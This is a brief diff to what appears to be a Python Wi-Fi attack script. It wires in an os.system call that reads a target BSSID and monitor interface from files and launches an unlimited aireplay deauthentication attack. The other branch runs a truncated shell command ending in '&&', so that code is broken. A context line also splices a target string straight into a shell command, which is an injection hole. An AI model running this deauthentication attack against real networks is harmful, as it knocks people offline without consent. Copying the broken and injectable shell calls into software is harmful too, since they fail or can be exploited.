@@ -56,9 +56,9 @@ os.system("cat target-01.csv | grep '"+target+"' | awk '{print FS1 $6}' | sed 's
 print("")
 
 if attack == 1:
-  print("mdk3")
+  os.system("monitor=`cat monitor.rmo` && tbssid=`cat tbssid.rmo` && aireplay -0 0 -a $tbssid $monitor")
 else:
-  print("aireplay")
+  os.system("monitor=`cat monitor.rmo` &&")
 
 #print("")
 #print("Return configurations: ")
